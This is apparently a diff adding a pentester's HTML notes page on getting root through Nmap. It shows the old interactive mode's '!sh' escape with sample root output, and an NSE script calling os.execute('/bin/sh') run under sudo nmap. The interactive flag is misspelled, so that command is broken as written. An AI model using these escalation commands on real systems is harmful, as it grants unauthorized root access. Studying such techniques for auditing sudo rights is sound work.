@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Nmap</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Nmap</h1></strong><br />Nmap is an attacking powerhouse, but is vulnerable itself.<br /><br /><strong><h2>## Nmap 2.02 - 5.21 - Interactive Mode</h2></strong><br />In older versions of Nmap, versions 2.02 to 5.21, <br />there was an interactive mode in which you could execute shell commands using <code>!</code><br /><br />Check version<br /><code>nmap --version</code><br />Spawn interactive shell<br /><code>nmap --interacitve<br /><br /></code>If you have the permissions to run Nmap as <code>root,</code> this will drop you into a root shell.<code><br /></code><div class="codebox"><div class="codebox">nmap&gt;&nbsp;!sh<br />#&nbsp;id<br />uid=1002(robot)&nbsp;gid=1002(robot)&nbsp;euid=0(root)&nbsp;groups=0(root),1002(robot)<br />#&nbsp;whoami<br />root</div></div><br /><br /><strong><h2>## Execute commands via .nse script</h2></strong><br />This might only be Nmap versions 5.21 and higher (can&#39;t remember).<br /><br />You can run system commands with Nmap by creating an nmap script.<br /><code>echo &quot;os.execute(&#39;whoami&#39;)&quot; &gt; command.nse<br />nmap --script=command.nse</code><br /><br />If you <code>sudo</code> rights to run <code>nmap</code> as <code>root</code>, you can run these commands as root.<br />Nmap is usually installed with <code>sudo</code> rights.<br /><div class="codebox"><div class="codebox">echo&nbsp;&quot;os.execute(&#39;/bin/sh&#39;)&quot;&nbsp;&gt;&nbsp;exploit.nse<br />sudo&nbsp;nmap&nbsp;--script=exploit.nse</div></div><br /><br /><br /><br /></div>
+</body>
+</html>
